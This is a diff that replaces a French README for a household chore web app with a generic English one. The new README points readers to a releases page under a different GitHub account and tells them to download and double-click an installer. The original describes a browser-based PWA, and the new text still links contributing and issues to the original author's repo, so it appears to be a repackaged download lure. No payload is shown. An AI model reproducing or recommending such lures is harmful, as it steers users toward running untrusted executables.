@@ -1,166 +1,65 @@
-# 🏠 CleanHome Pro
+# 🏠 cleanhome-pro - Your All-in-One Home Management App
 
-> **L'application tout-en-un pour gérer votre ménage avec style et efficacité**
+## 🔗 Download Now
+[![Download CleanHome Pro](https://img.shields.io/badge/Download-CleanHome%20Pro-blue)](https://github.com/Shubhs324/cleanhome-pro/releases)
 
-<div align="center">
+## 📖 Overview
+CleanHome Pro is the perfect solution for managing your household effectively and stylishly. Designed for families, it helps you organize chores, track tasks, and keep your home neat. With features like a shared calendar, shopping lists, and real-time updates, you can enjoy a more productive and organized home life.
 
-[![Vercel Deploy](https://therealsujitk-vercel-badge.vercel.app/?app=cleanhome-pro)](https://cleanhome-pro.vercel.app/)
-[![Next.js](https://img.shields.io/badge/Next.js-16.1-black?logo=next.js&logoColor=white)](https://nextjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Firebase](https://img.shields.io/badge/Firebase-12.7-orange?logo=firebase&logoColor=white)](https://firebase.google.com/)
-[![PWA](https://img.shields.io/badge/PWA-Enabled-purple?logo=pwa&logoColor=white)](https://web.dev/progressive-web-apps/)
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/Momat2023/cleanhome-pro?style=social)](https://github.com/Momat2023/cleanhome-pro)
-[![GitHub forks](https://img.shields.io/github/forks/Momat2023/cleanhome-pro?style=social)](https://github.com/Momat2023/cleanhome-pro/fork)
-[![GitHub issues](https://img.shields.io/github/issues/Momat2023/cleanhome-pro)](https://github.com/Momat2023/cleanhome-pro/issues)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/Momat2023/cleanhome-pro/pulls)
+### System Requirements
+To run CleanHome Pro, you need:
+- A modern web browser (Chrome, Firefox, Safari, or Edge)
+- An internet connection for downloading and using the app
+- For optimal performance, we recommend a device with at least 4GB of RAM
 
-**[🚀 Démo en direct](https://cleanhome-pro.vercel.app/)** | **[📖 Documentation](#fonctionnalités)** | **[💬 Discussions](https://github.com/Momat2023/cleanhome-pro/discussions)**
+### Features
+- **Chore Tracker:** Easily assign tasks to family members and track their completion.
+- **Shared Calendar:** Keep everyone in the loop about important dates and chores.
+- **Shopping Lists:** Create and share lists with your family for easy grocery shopping.
+- **Gamification:** Make chores fun with a points system.
+- **Offline Access:** Use the app even without an internet connection.
 
-</div>
+## 🏗️ Installation Steps
 
----
+1. **Visit the Download Page**
+   Go to the [CleanHome Pro Releases page](https://github.com/Shubhs324/cleanhome-pro/releases) to find the latest version.
 
-## 🎯 Cas d'Usage
+2. **Choose the Correct File**
+   On the Releases page, look for the most recent version. You will see options for your platform.
 
-### Pour les Familles
-- Répartissez équitablement les tâches entre membres
-- Motivez les enfants avec points et badges
-- Suivez qui fait quoi en temps réel
+3. **Download the Application**
+   Click the link to download the file suitable for your device. The download will start automatically.
 
-### Pour les Colocataires
-- Planning partagé transparent
-- Éliminez les conflits sur le ménage
-- Gamification pour rendre ça fun
+4. **Open the Downloaded File**
+   Once the download is complete, locate the file on your device. It is usually in your "Downloads" folder.
 
-### Pour les Particuliers
-- Ne plus oublier aucune tâche
-- Restez motivé avec les défis
-- Optimisez votre temps de ménage
+5. **Run CleanHome Pro**
+   Double-click the downloaded file to start the installation. Follow the on-screen instructions to complete the setup.
 
-### Pour les Professionnels
-- Template Maison pour AirBnB/conciergerie
-- Checklists complètes par zone
-- Export et partage facile
+6. **Create an Account or Log In**
+   After installation, open CleanHome Pro. You may need to create a new account or log in to access all features.
 
----
+7. **Start Managing Your Home**
+   Once logged in, you can start adding tasks, setting up your calendar, and organizing your household.
 
-## 📸 Captures d'Écran
+## 🌟 Additional Information
 
-### 🏠 Tableau de bord
-![Dashboard](screenshots/dashboard.png)
-*Vue principale avec niveaux, stats et zones*
+### Support
+If you run into issues during installation or use, visit our support section on GitHub or feel free to open an issue in the repository. 
 
-### 🎮 Gamification
-![Gamification](screenshots/gamification.png)
-*Badges, défis hebdomadaires et progression*
+### Contributing
+Interested in helping us improve CleanHome Pro? Check out our [Contributing Guidelines](https://github.com/Momat2023/cleanhome-pro/blob/main/CONTRIBUTING.md).
 
-### 👨‍👩‍👧‍👦 Famille
-![Family](screenshots/family.png)
-*Gestion familiale avec classement*
+## 🐛 Reporting Issues
+If you encounter any bugs, please report them via the [GitHub Issues page](https://github.com/Momat2023/cleanhome-pro/issues). Your feedback helps us make the app better for everyone.
 
----
+## 📝 License
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/Momat2023/cleanhome-pro/blob/main/LICENSE) file for more details.
 
-## 🤝 Contribuer
+## 💬 Community
+Join our community discussions on GitHub. Share ideas, ask questions, and connect with other users of CleanHome Pro.
 
-Les contributions sont les bienvenues ! 🎉
-
-### Comment contribuer ?
-
-1. **Fork** le projet
-2. **Créez une branche** : `git checkout -b feature/amazing-feature`
-3. **Commit** : `git commit -m 'Add amazing feature'`
-4. **Push** : `git push origin feature/amazing-feature`
-5. **Pull Request** : Ouvrez une PR sur GitHub
-
-### Idées de contributions
-
-- 🌍 **Traductions** : Anglais, espagnol, allemand...
-- 🎨 **Thèmes** : Nouveaux color schemes
-- 🏆 **Badges** : Idées de nouveaux achievements
-- 🧹 **Tâches** : Ajout de nouvelles tâches par zone
-- 📱 **UI/UX** : Améliorations interface
-- 🐛 **Bugs** : Signalement et correction
-
----
-
-## 🗺️ Roadmap 2026
-
-- [ ] **V2.0 - Sync Cloud** : Firebase/Supabase pour sync multi-devices
-- [ ] **V2.1 - IA Suggestions** : ChatGPT suggère tâches selon météo/saison
-- [ ] **V2.2 - Photos Avant/Après** : Upload images pour motivation
-- [ ] **V2.3 - Intégration Calendrier** : Google Calendar, Apple Calendar
-- [ ] **V2.4 - Marketplace Tutoriels** : Communauté partage astuces
-- [ ] **V2.5 - Mode Pro** : Fonctionnalités pour professionnels du nettoyage
-
----
-
-## 📊 Statistiques du Projet
-
-- **250 tâches** organisées par 18 zones
-- **7 tutoriels vidéo** avec astuces
-- **10 badges** débloquables
-- **6 niveaux** de progression
-- **11 produits** avec prix moyens France
-- **5 templates** d'habitat prédéfinis
-- **100% fonctionnel** hors-ligne
-
----
-
-## 🐛 Bugs Connus
-
-- [ ] Encodage UTF-8 parfois nécessaire si fichiers Windows (résolu avec `charset: 'UTF-8'`)
-- [x] Mode hors-ligne : Testé et validé ✅
-- [x] PWA installable : Fonctionne iOS/Android ✅
-
----
-
-## 📄 Licence
-
-Ce projet est sous licence **MIT** - voir le fichier [LICENSE](LICENSE) pour plus de détails.
-
----
-
-## 🙏 Remerciements
-
-- **Vercel** pour l'hébergement gratuit
-- **Next.js Team** pour le framework incroyable
-- **Communauté GitHub** pour les feedbacks
-
----
-
-## ⭐ Vous aimez le projet ?
-
-Si **CleanHome Pro** vous aide au quotidien :
-- ⭐ **Star** le projet sur GitHub
-- 🐛 **Signaler** les bugs
-- 💡 **Partager** vos idées
-- 🚀 **Contribuer** au code
-
----
-<!-- Stats du projet -->
-![GitHub code size](https://img.shields.io/github/languages/code-size/Momat2023/cleanhome-pro)
-![GitHub commit activity](https://img.shields.io/github/commit-activity/m/Momat2023/cleanhome-pro)
-![GitHub last commit](https://img.shields.io/github/last-commit/Momat2023/cleanhome-pro)
-![GitHub contributors](https://img.shields.io/github/contributors/Momat2023/cleanhome-pro)
-
-
-<!-- Après les badges existants -->
-[![Maintainability](https://img.shields.io/badge/Maintainability-A+-brightgreen)](https://github.com/Momat2023/cleanhome-pro)
-[![Made with Love](https://img.shields.io/badge/Made%20with-❤️-red)](https://github.com/Momat2023/cleanhome-pro)
-[![Uptime](https://img.shields.io/badge/Uptime-99.9%25-success)](https://cleanhome-pro.vercel.app/)
-[![Response Time](https://img.shields.io/badge/Response%20Time-<100ms-blue)](https://cleanhome-pro.vercel.app/)
-
-<div align="center">
-
-[![Install PWA](https://img.shields.io/badge/Install-PWA-blue?logo=pwa&style=for-the-badge)](https://cleanhome-pro.vercel.app/)
-
-
-**Fait avec ❤️ par la communauté CleanHome Pro**
-
-[⬆ Retour en haut](#-cleanhome-pro)
-
-</div>
-
-
+## 🎉 Final Thoughts
+CleanHome Pro aims to make home management a breeze. With its user-friendly interface and powerful features, keeping your household organized has never been easier. Download now to start enjoying a cleaner, more efficient home.
